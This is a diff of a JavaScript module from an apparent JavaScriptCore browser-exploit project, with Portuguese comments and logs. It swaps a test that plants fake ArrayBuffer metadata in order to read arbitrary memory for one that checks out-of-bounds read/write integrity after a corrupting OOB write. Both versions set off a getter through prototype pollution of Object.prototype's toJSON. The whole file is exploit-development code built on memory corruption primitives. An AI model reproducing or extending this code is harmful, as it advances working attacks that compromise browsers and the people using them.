@@ -11,23 +11,22 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForSliceTest";
+const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForIntegrityTest";
 let getter_called_flag = false;
-let current_test_results = { success: false, message: "Teste não iniciado.", error: null };
+let current_test_results = { success: false, message: "Teste não iniciado.", error: null, data_read: null };
 
-// Metadados sombra que plantamos
-const SHADOW_DATA_POINTER = new AdvancedInt64(0x1, 0x0);
-const SHADOW_SIZE = new AdvancedInt64(0x1000, 0x0); // 4096 bytes
+const DATA_PATTERN_TO_WRITE_READ = 0x12345678;
+const DATA_OFFSET_FOR_INTEGRITY_TEST = 0x100; // Offset dentro do oob_array_buffer_real (relativo ao início do backing store)
 
-class CheckpointObjectForSliceTest {
+class CheckpointObjectForIntegrityTest {
     constructor(id) {
-        this.id = `SliceTestCheckpoint-${id}`;
+        this.id = `IntegrityTestCheckpoint-${id}`;
     }
 }
 
-export function toJSON_TriggerSliceTestGetter() {
-    const FNAME_toJSON = "toJSON_TriggerSliceTestGetter";
-    if (this instanceof CheckpointObjectForSliceTest) {
+export function toJSON_TriggerIntegrityTestGetter() {
+    const FNAME_toJSON = "toJSON_TriggerIntegrityTestGetter";
+    if (this instanceof CheckpointObjectForIntegrityTest) {
         logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
         try {
             // eslint-disable-next-line no-unused-vars
@@ -41,13 +40,14 @@ export function toJSON_TriggerSliceTestGetter() {
 
 // A função exportada mantém o nome para compatibilidade
 export async function executeRetypeOOB_AB_Test() {
-    const FNAME_TEST = "executeSliceTestInGetter";
-    logS3(`--- Iniciando Teste .slice() no Getter após Escrita OOB ---`, "test", FNAME_TEST);
+    const FNAME_TEST = "executeIntegrityTestInGetter";
+    logS3(`--- Iniciando Teste de Integridade do oob_array_buffer_real no Getter ---`, "test", FNAME_TEST);
 
     getter_called_flag = false;
-    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null };
+    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null, data_read: null };
 
-    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
+    // Validações de config...
+    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) {
         logS3("Offsets críticos não definidos. Abortando.", "critical", FNAME_TEST);
         current_test_results.message = "Offsets críticos não definidos.";
         return;
@@ -68,65 +68,52 @@ export async function executeRetypeOOB_AB_Test() {
         }
         logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);
 
-        // 1. Plantar "Metadados Sombra" (ArrayBufferContents falsos)
-        const shadow_contents_offset_in_oob_data = 0x0;
-        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SHADOW_SIZE, 8);
-        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, SHADOW_DATA_POINTER, 8);
-        logS3(`Metadados sombra plantados: ptr=${SHADOW_DATA_POINTER.toString(true)}, size=${SHADOW_SIZE.toString(true)}`, "info", FNAME_TEST);
+        // 1. Escrever o padrão de dados no offset de teste ANTES de acionar o getter
+        logS3(`Escrevendo padrão de dados ${toHex(DATA_PATTERN_TO_WRITE_READ)} em oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}]...`, "info", FNAME_TEST);
+        oob_write_absolute(DATA_OFFSET_FOR_INTEGRITY_TEST, DATA_PATTERN_TO_WRITE_READ, 4); // Escreve 4 bytes
 
-        // 2. Realizar a escrita OOB "gatilho" (usando o valor que sabemos que funciona)
+        // 2. Realizar a escrita OOB "gatilho" que aciona o getter
         const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
         const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Valor conhecido por acionar o getter
         oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
         logS3(`Escrita OOB gatilho em ${toHex(corruption_trigger_offset_abs)} do oob_data completada.`, "info", FNAME_TEST);
 
         // 3. Configurar o getter e poluir
-        const checkpoint_obj = new CheckpointObjectForSliceTest(1);
-        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForSliceTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
+        const checkpoint_obj = new CheckpointObjectForIntegrityTest(1);
+        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForIntegrityTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
 
-        Object.defineProperty(CheckpointObjectForSliceTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
+        Object.defineProperty(CheckpointObjectForIntegrityTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
             get: function() { // Getter SÍNCRONO
                 getter_called_flag = true;
-                const FNAME_GETTER = "SliceTest_Getter";
-                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Testando oob_array_buffer_real.slice(0, 8)...`, "vuln", FNAME_GETTER);
-                current_test_results = { success: false, message: "Getter chamado, teste .slice() em andamento.", error: null };
+                const FNAME_GETTER = "IntegrityTest_Getter";
+                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Testando leitura de oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}]...`, "vuln", FNAME_GETTER);
+                
+                let read_value = null;
+                let read_error = null;
 
                 try {
-                    if (!oob_array_buffer_real) {
-                        current_test_results.message = "oob_array_buffer_real era null no getter.";
-                        logS3("DENTRO DO GETTER: oob_array_buffer_real é null!", "critical", FNAME_GETTER);
+                    if (!oob_array_buffer_real || !oob_read_absolute) { // Verifica oob_read_absolute também
+                        current_test_results.message = "oob_array_buffer_real ou oob_read_absolute era null no getter.";
+                        logS3("DENTRO DO GETTER: oob_array_buffer_real ou oob_read_absolute é null!", "critical", FNAME_GETTER);
                         return 0xDEADDEAD;
                     }
 
-                    logS3(`DENTRO DO GETTER: Tentando oob_array_buffer_real.slice(0, 8). byteLength original reportado: ${oob_array_buffer_real.byteLength}`, "info", FNAME_GETTER);
-                    
-                    // A tentativa crítica: chamar .slice()
-                    // Se oob_array_buffer_real foi re-tipado para usar os metadados sombra (data_ptr=0x1, size=0x1000),
-                    // slice(0,8) tentaria ler 8 bytes a partir do endereço 0x1.
-                    let new_sliced_ab = oob_array_buffer_real.slice(0, 8);
+                    logS3(`DENTRO DO GETTER: Tentando ler de oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}] usando oob_read_absolute...`, "info", FNAME_GETTER);
+                    read_value = oob_read_absolute(DATA_OFFSET_FOR_INTEGRITY_TEST, 4); // Lê 4 bytes
+                    current_test_results.data_read = toHex(read_value);
 
-                    // Se chegarmos aqui, o slice NÃO causou um erro visível ao JS.
-                    logS3(`DENTRO DO GETTER: oob_array_buffer_real.slice(0, 8) BEM-SUCEDIDO INESPERADAMENTE. new_sliced_ab.byteLength: ${new_sliced_ab.byteLength}`, "error", FNAME_GETTER);
-                    // Verificar o conteúdo para ver de onde ele realmente leu
-                    if (new_sliced_ab.byteLength === 8) {
-                        const dv_slice = new DataView(new_sliced_ab);
-                        logS3(`DENTRO DO GETTER: Conteúdo do slice (primeiros 4 bytes): ${toHex(dv_slice.getUint32(0,true))}`, "info", FNAME_GETTER);
+                    if (read_value === DATA_PATTERN_TO_WRITE_READ) {
+                        logS3(`DENTRO DO GETTER: SUCESSO! Lido ${toHex(read_value)} corretamente de oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}]. oob_array_buffer_real está íntegro para R/W.`, "good", FNAME_GETTER);
+                        current_test_results = { success: true, message: `oob_array_buffer_real íntegro. Lido ${toHex(read_value)} corretamente.`, data_read: toHex(read_value), error: null };
+                    } else {
+                        logS3(`DENTRO DO GETTER: FALHA NA INTEGRIDADE! Lido ${toHex(read_value)} de oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}], esperado ${toHex(DATA_PATTERN_TO_WRITE_READ)}.`, "error", FNAME_GETTER);
+                        current_test_results = { success: false, message: `Falha na integridade do oob_array_buffer_real. Lido ${toHex(read_value)}, esperado ${toHex(DATA_PATTERN_TO_WRITE_READ)}.`, data_read: toHex(read_value), error: "Mismatch" };
                     }
-                    current_test_results.message = `slice(0,8) NÃO causou erro. new_sliced_ab.byteLength: ${new_sliced_ab.byteLength}.`;
 
                 } catch (e) {
-                    logS3(`DENTRO DO GETTER: ERRO durante oob_array_buffer_real.slice(): ${e.message}`, "error", FNAME_GETTER);
-                    // Verificar se o erro é o esperado (RangeError, erro de acesso à memória)
-                    if (String(e.message).toLowerCase().includes("rangeerror") || 
-                        String(e.message).toLowerCase().includes("memory access out of bounds") ||
-                        String(e.message).toLowerCase().includes("segmentation fault") ||
-                        String(e.message).toLowerCase().includes("bus error") ||
-                        String(e.message).toLowerCase().includes("bad access")) {
-                        logS3(`DENTRO DO GETTER: SUCESSO ESPECULATIVO! O erro '${e.message}' é CONSISTENTE com slice() tentando ler de ${SHADOW_DATA_POINTER.toString(true)}!`, "vuln", FNAME_GETTER);
-                        current_test_results = { success: true, message: `.slice() causou CRASH CONTROLADO esperado ('${e.message}') ao tentar ler de ${SHADOW_DATA_POINTER.toString(true)}.`, error: String(e) };
-                    } else {
-                        current_test_results = { success: false, message: `Erro inesperado com .slice(): ${e.message}`, error: String(e) };
-                    }
+                    logS3(`DENTRO DO GETTER: ERRO durante oob_read_absolute: ${e.message}`, "error", FNAME_GETTER);
+                    read_error = String(e);
+                    current_test_results = { success: false, message: `Erro ao ler de oob_array_buffer_real no getter: ${e.message}`, data_read: null, error: read_error };
                 }
                 return 0xBADF00D;
             },
@@ -135,7 +122,7 @@ export async function executeRetypeOOB_AB_Test() {
         getterPollutionApplied = true;
 
         originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
-        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerSliceTestGetter, writable: true, enumerable: false, configurable: true});
+        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerIntegrityTestGetter, writable: true, enumerable: false, configurable: true});
         toJSONPollutionApplied = true;
         logS3(`Poluições aplicadas.`, "info", FNAME_TEST);
 
@@ -149,25 +136,25 @@ export async function executeRetypeOOB_AB_Test() {
     } catch (mainError) {
         logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
         console.error(mainError);
-        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError) };
+        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError), data_read: null };
     } finally {
         // Restauração
         if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { delete Object.prototype[ppKey_val]; if(originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc); }
-        if (getterPollutionApplied && CheckpointObjectForSliceTest.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { delete CheckpointObjectForSliceTest.prototype[GETTER_CHECKPOINT_PROPERTY_NAME]; if(originalGetterDesc) Object.defineProperty(CheckpointObjectForSliceTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc); }
+        if (getterPollutionApplied && CheckpointObjectForIntegrityTest.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { delete CheckpointObjectForIntegrityTest.prototype[GETTER_CHECKPOINT_PROPERTY_NAME]; if(originalGetterDesc) Object.defineProperty(CheckpointObjectForIntegrityTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc); }
         logS3("Limpeza finalizada.", "info", "CleanupFinal");
     }
 
     if (getter_called_flag) {
         if (current_test_results.success) {
-            logS3(`RESULTADO TESTE SLICE: ${current_test_results.message}`, "vuln", FNAME_TEST);
+            logS3(`RESULTADO TESTE INTEGRIDADE: ${current_test_results.message}`, "good", FNAME_TEST);
         } else {
-            logS3(`RESULTADO TESTE SLICE: Getter chamado, mas sem sucesso. ${current_test_results.message}`, "warn", FNAME_TEST);
+            logS3(`RESULTADO TESTE INTEGRIDADE: Getter chamado, mas falha/erro. ${current_test_results.message}`, "error", FNAME_TEST);
         }
     } else {
-        logS3("RESULTADO TESTE SLICE: Getter NÃO foi chamado.", "error", FNAME_TEST);
+        logS3("RESULTADO TESTE INTEGRIDADE: Getter NÃO foi chamado.", "error", FNAME_TEST);
     }
     logS3(`  Detalhes finais: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);
 
     clearOOBEnvironment();
-    logS3(`--- Teste .slice() no Getter Concluído ---`, "test", FNAME_TEST);
+    logS3(`--- Teste de Integridade do oob_array_buffer_real Concluído ---`, "test", FNAME_TEST);
 }
